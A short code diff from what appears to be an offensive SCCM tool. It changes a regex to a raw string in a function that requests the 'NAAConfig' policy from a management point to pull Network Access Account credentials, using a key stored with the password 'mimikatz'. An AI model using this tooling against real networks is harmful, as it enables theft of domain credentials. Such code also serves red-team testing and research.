@@ -84,7 +84,7 @@ class HTTP:
             with open (f"{self.logs_dir}/{self.uuid}.pem", "rb") as g:
                 key = serialization.load_pem_private_key(g.read(), password=b"mimikatz")           
             deflatedData = sccmwtf.sendCCMPostRequest(data=data, mp=target_mp_url)
-            result = re.search("PolicyCategory=\"NAAConfig\".*?<!\[CDATA\[https*://<mp>([^]]+)", deflatedData, re.DOTALL + re.MULTILINE)
+            result = re.search(r"PolicyCategory=\"NAAConfig\".*?<!\[CDATA\[https*://<mp>([^]]+)", deflatedData, re.DOTALL + re.MULTILINE)
             urls = [result.group(1)]
             for url in urls:
                 result = sccmwtf.requestPolicy(url)
